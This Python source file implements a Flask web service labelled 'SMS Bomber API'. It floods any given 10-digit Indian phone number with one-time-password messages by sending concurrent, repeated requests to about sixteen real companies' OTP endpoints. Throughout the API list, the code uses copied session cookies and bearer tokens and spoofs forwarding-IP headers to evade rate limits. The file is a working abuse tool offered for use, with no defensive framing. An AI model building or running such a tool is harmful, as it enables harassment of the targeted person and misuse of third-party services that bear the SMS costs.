import asyncio
import json,aiohttp
import sys
import urllib.parse
import uuid
import time
import os
from flask import Flask, request, jsonify

async def send_request(session, api, phone_number, ip_address, silent=False):
    try:
        if api["method"] == "POST":
            if api["headers"].get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in api["payload"].items())
                api["headers"]["Content-Length"] = str(len(payload_str.encode('utf-8')))
                response = await session.post(api["endpoint"], data=payload_str, headers=api["headers"], timeout=5, ssl=False)
            else:
                response = await session.post(api["endpoint"], json=api["payload"], headers=api["headers"], timeout=5, ssl=False)
        else:
            if not silent:
                print(f"[!] Unsupported method for {api['endpoint']}")
            return None, api
        
        status_code = response.status
        api_name = api["endpoint"].split("//")[1].split("/")[0] if "//" in api["endpoint"] else api["endpoint"]
        
        if not silent:
            if status_code in [200, 201, 202]:
                print(f"[✓] OTP Sent via {api_name} | Status: {status_code}")
            elif status_code == 429:
                print(f"[!] Rate Limited: {api_name} | Status: {status_code}")
            elif status_code == 400:
                print(f"[✗] Bad Request: {api_name} | Status: {status_code}")
            elif status_code == 401:
                print(f"[✗] Unauthorized: {api_name} | Status: {status_code}")
            elif status_code == 403:
                print(f"[✗] Forbidden: {api_name} | Status: {status_code}")
            elif status_code == 404:
                print(f"[✗] Not Found: {api_name} | Status: {status_code}")
            else:
                print(f"[?] {api_name} | Status: {status_code}")
        
        return status_code, api
    except asyncio.TimeoutError:
        api_name = api["endpoint"].split("//")[1].split("/")[0] if "//" in api["endpoint"] else api["endpoint"]
        if not silent:
            print(f"[!] Timeout: {api_name}")
        return None, api
    except aiohttp.ClientError as e:
        api_name = api["endpoint"].split("//")[1].split("/")[0] if "//" in api["endpoint"] else api["endpoint"]
        if not silent:
            print(f"[✗] Error: {api_name} - {str(e)[:50]}")
        return None, api
    except Exception as e:
        api_name = api["endpoint"].split("//")[1].split("/")[0] if "//" in api["endpoint"] else api["endpoint"]
        if not silent:
            print(f"[✗] Unknown Error: {api_name} - {str(e)[:50]}")
        return None, api

def get_apis_list(phone_number, ip_address):
    return [
        {
            "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "payload": {
                "mobileNo": phone_number,
                "countryCode": "+91",
                "appCode": "un",
                "messageId": "1",
                "emailId": "",
                "subject": "Register",
                "priority": "1",
                "device": "web",
                "variant": "v1",
                "templateCode": 1
            },
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "identifier": "home",
                "mlang": "en",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "alang": "en",
                "country_code": "IN",
                "vlang": "en",
                "origin": "https://www.hungama.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.hungama.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Mobilenumber": phone_number,
                "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
                "Oauthtoken": "",
                "AppVersion": "245",
                "ApiVersion": "6.2.55",
                "DeviceType": "Android",
                "DeviceId": "44098bdebb2dc047",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "merucabapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "payload": {"api": "send_otp", "brand": "dayco", "mob": phone_number, "resend_otp": "resend_otp"},
            "headers": {
                "Host": "ekyc.daycoindia.com",
                "sec-ch-ua-platform": "\"Android\"",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://ekyc.daycoindia.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
                "Priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "payload": {
                "app_version": "7.10.51",
                "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
                "course": "",
                "phone_number": phone_number,
                "language": "en",
                "udid": "b751fb63c0ae17ba",
                "class": "",
                "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
            },
            "headers": {
                "version_code": "1160",
                "has_upi": "false",
                "device_model": "ASUS_I005DA",
                "android_sdk_version": "28",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "payload": {"phone": phone_number, "countryCode": "IN"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
                "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
                "origin": "https://www.nobroker.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.nobroker.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address,
                "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
            }
        },
        {
            "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "payload": {"mobileNumber": phone_number},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "Android",
                "authorization": "Bearer null",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://app.shiprocket.in",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.shiprocket.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
            "method": "POST",
            "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": phone_number},
            "headers": {
                "Host": "api.penpencil.co",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
            "method": "POST",
            "payload": {"phone_number": {"number": phone_number, "country_code": "+91"}},
            "headers": {
                "Host": "api.kpnfresh.com",
                "sec-ch-ua-platform": "\"Android\"",
                "cache": "no-store",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "x-channel-id": "WEB",
                "sec-ch-ua-mobile": "?1",
                "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
                "accept": "*/*",
                "origin": "https://www.kpnfresh.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.kpnfresh.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
                "Host": "api.servetel.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.district.in/gw/auth/generate_otp",
            "method": "POST",
            "payload": {"phone_number": phone_number, "country_code": "91"},
            "headers": {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "cookie": "AKA_A2=A; x-device-id=8c86731e-b245-4365-9e5f-715addab5bcd",
                "origin": "https://www.district.in",
                "priority": "u=1, i",
                "referer": "https://www.district.in/movies/",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "x-app-type": "ed_web",
                "x-app-version": "11.11.1",
                "x-device-id": "8c86731e-b245-4365-9e5f-715addab5bcd",
                "x-guest-token": "1212",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://userservice.goibibo.com/ext/web/desktop/send/token/OTP_IS_REG",
            "method": "POST",
            "payload": {
                "loginId": phone_number,
                "countryCode": 91,
                "channel": ["mobile"],
                "type": 6,
                "appHashKey": ""
            },
            "headers": {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "authorization": "jkO7Ivpwsh4KaQ9",
                "content-type": "application/json",
                "currency": "inr",
                "host": "userservice.goibibo.com",
                "language": "eng",
                "origin": "https://www.goibibo.com",
                "referer": "https://www.goibibo.com/",
                "region": "in",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "user-identifier": '{"type":"auth","deviceId":"96f868a8-d65d-4ea1-a28d-0cad561f8cee","os":"desktop","osVersion":"osVersion","appVersion":"appVersion","imie":"imie","ipAddress":"ipAddress","timeZone":"+5.30 GMT","value":"","deviceOrBrowserInfo":"Chrome"}',
                "x-request-tracker": "201102b1-5d2e-44d4-a446-cd0387d6973d",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.fabhotels.com//consumer/v1/mweb/user/web/login",
            "method": "POST",
            "payload": {
                "mobile": phone_number,
                "userSource": "MWEB",
                "userType": "ONLINE",
                "countryCode": "91",
                "isoCode": "IN",
                "cleverTapId": "626c1565d92b4af4a0a76dddaa324c34",
                "firstName": "",
                "lastName": "",
                "password": "",
                "payload": "",
                "referralCode": None,
                "signature": ""
            },
            "headers": {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "cookie": "dab=3; visitorid=CgACA2lS2G04FTtpC/JkAg==; PHPSESSID=9mfq3bec50clavl9tu0k4iggeu",
                "origin": "https://www.fabhotels.com",
                "priority": "u=1, i",
                "referer": "https://www.fabhotels.com/",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.cleartrip.com/accounts/external-api/otp",
            "method": "POST",
            "payload": {
                "type": "MOBILE",
                "value": phone_number,
                "countryCode": "+91",
                "action": "SIGNIN"
            },
            "headers": {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "ab-otp": "b",
                "app-agent": "DESKTOP",
                "baggage": "sentry-environment=production,sentry-public_key=38a8785b30295eec5bb15535a6fc01f8,sentry-trace_id=bf321542ee634ff0ae04ecc480606851,sentry-org_id=4510040130650112,sentry-transaction=%2F,sentry-sampled=false,sentry-sample_rand=0.7943094735393529,sentry-sample_rate=0.1",
                "caller": "https://www.cleartrip.com",
                "channel": "desktop",
                "content-type": "application/json",
                "cookie": "rbzid=2nUwutW2iM+3fY1GHWDPjDAayQh9iPznW+8xiF5OCohShssgRP6rLq3sBnFDWd2SBHZCr4PotyKX4sQYAXKW2cJ1KtGgsSqbUSY/Tn96fSZq7oZI1N8zCI3tZFvDfQ5TuIl3n5TLip5T7yBWMxkgyttjZ8a30JH7LQ6SnlENFzrof9XH0XIZ92V7RBEq580IqTXAcJWWlFifd0DeOb4YUbQd3HOlNEDMKmRakS3qVog=; rbzsessionid=e11d75c7653aeb53c306b2476ba8feca",
                "origin": "https://www.cleartrip.com",
                "priority": "u=1, i",
                "referer": "https://www.cleartrip.com/",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sentry-trace": "bf321542ee634ff0ae04ecc480606851-b698163a55059db2-0",
                "traceparent": "00-5d80089debcfc04b6e0ef97552524caf-f63c73d39c12f25c-01",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "x-client-id": "cleartrip",
                "x-source-type": "Desktop",
                "x-unified-header": '{"platform":"desktop","trackingId":"fffc145b-bd7f-47c2-9844-147413df0549","source":"CLEARTRIP","deviceModel":"nexus 5"}',
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://secure.yatra.com/social/common/yatra/sendMobileOTP",
            "method": "POST",
            "payload": {
                "isdCode": "91",
                "mobileNumber": phone_number
            },
            "headers": {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "JSESSIONID=2B0ED71E1C6B2D626B3D65930E002F14; reactHome=true; smeLoginForm=true; newHotelUI100=true; deviceType=DESKTOP",
                "origin": "https://secure.yatra.com",
                "priority": "u=1, i",
                "referer": "https://secure.yatra.com/social/common/yatra/signin.htm",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "x-requested-with": "XMLHttpRequest",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://secure.yatra.com/social/common/yatra/mobileStatus",
            "method": "POST",
            "payload": {
                "isdCode": "91",
                "mobileNumber": phone_number
            },
            "headers": {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "JSESSIONID=2B0ED71E1C6B2D626B3D65930E002F14; reactHome=true; smeLoginForm=true; newHotelUI100=true; deviceType=DESKTOP",
                "origin": "https://secure.yatra.com",
                "priority": "u=1, i",
                "referer": "https://secure.yatra.com/social/common/yatra/signin.htm",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "x-requested-with": "XMLHttpRequest",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://b2cutilsapi.akbartravels.com/Utils/LoginOtp",
            "method": "POST",
            "payload": {
                "TUI": f"{uuid.uuid4()}|{uuid.uuid4()}|{time.strftime('%Y%m%d%H%M%S')}",
                "ClientID": phone_number,
                "CountryCode": "+91",
                "Type": "M"
            },
            "headers": {
                "accept": "application/json, text/plain, */*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjMzMyIsIm5iZiI6MTc2NzA5MzI3MywiZXhwIjoxNzY3MTc5NjczLCJpYXQiOjE3NjcwOTMyNzMsImlzcyI6IndlYmNvbm5lY3QiLCJhdWQiOiJjbGllbnQifQ.5d_FhnK2bbfyU1RQ3SG3xoEX55ABCjinKImOE_FGBP4",
                "content-type": "application/json",
                "origin": "https://www.akbartravels.com",
                "priority": "u=1, i",
                "referer": "https://www.akbartravels.com/",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        }
    ]

async def send_otp_requests(phone_number, ip_address, rounds=1, silent=True):
    apis = get_apis_list(phone_number, ip_address)
    
    success_count = 0
    failed_count = 0
    success_apis = []
    failed_apis = []
    
    async with aiohttp.ClientSession() as session:
        for round_num in range(rounds):
            tasks = [send_request(session, api, phone_number, ip_address, silent=silent) for api in apis]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    failed_count += 1
                    continue
                
                status_code, api = result
                if status_code is None:
                    failed_count += 1
                    continue
                
                api_name = api["endpoint"].split("//")[1].split("/")[0] if "//" in api["endpoint"] else api["endpoint"]
                
                if status_code in [200, 201, 202]:
                    success_count += 1
                    if not any(s["api"] == api_name for s in success_apis):
                        success_apis.append({"api": api_name, "endpoint": api["endpoint"], "status": status_code})
                else:
                    failed_count += 1
                    if not any(f["api"] == api_name for f in failed_apis):
                        failed_apis.append({"api": api_name, "endpoint": api["endpoint"], "status": status_code})
            
            if round_num < rounds - 1:
                await asyncio.sleep(0.5)
    
    return {
        "success_count": success_count,
        "failed_count": failed_count,
        "total_apis": len(apis),
        "success_apis": success_apis,
        "failed_apis": failed_apis
    }

# Flask App
app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({
        "message": "SMS Bomber API",
        "endpoints": {
            "/send/<phone_number>": "Send OTP to phone number (10 digits without +91)",
            "/send?phone=<phone_number>": "Send OTP via query parameter"
        },
        "example": "/send/8789977777"
    })

@app.route('/send/<phone_number>', methods=['GET', 'POST'])
def send_otp(phone_number):
    try:
        # Validate phone number
        if not phone_number.isdigit() or len(phone_number) != 10:
            return jsonify({
                "success": False,
                "error": "Invalid phone number! Must be 10 digits without +91",
                "phone": phone_number
            }), 400
        
        ip_address = request.remote_addr or "192.168.1.1"
        rounds = int(request.args.get('rounds', 1))
        
        if rounds < 1 or rounds > 10:
            rounds = 1
        
        # Run async function
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        result = loop.run_until_complete(send_otp_requests(phone_number, ip_address, rounds))
        
        return jsonify({
            "success": True,
            "phone": phone_number,
            "total_apis": result["total_apis"],
            "success_count": result["success_count"],
            "failed_count": result["failed_count"],
            "success_apis": result["success_apis"],
            "failed_apis": result["failed_apis"]
        })
    
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e),
            "phone": phone_number
        }), 500

@app.route('/send', methods=['GET', 'POST'])
def send_otp_query():
    phone_number = request.args.get('phone') or (request.json.get('phone') if request.is_json else None)
    
    if not phone_number:
        return jsonify({
            "success": False,
            "error": "Phone number required! Use /send/<phone_number> or /send?phone=<phone_number>"
        }), 400
    
    return send_otp(phone_number)

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print("=" * 50)
    print("SMS Bomber API Server")
    print("Made By luci savex Anonymous")
    print("=" * 50)
    print("\nAPI Endpoints:")
    print(f"  GET/POST http://localhost:{port}/send/<phone_number>")
    print(f"  GET/POST http://localhost:{port}/send?phone=<phone_number>")
    print("\nExample:")
    print(f"  http://localhost:{port}/send/8789997777")
    print(f"  http://localhost:{port}/send?phone=8384884484&rounds=1")
    print(f"\nStarting server on http://0.0.0.0:{port}\n")
    app.run(host='0.0.0.0', port=port, debug=False)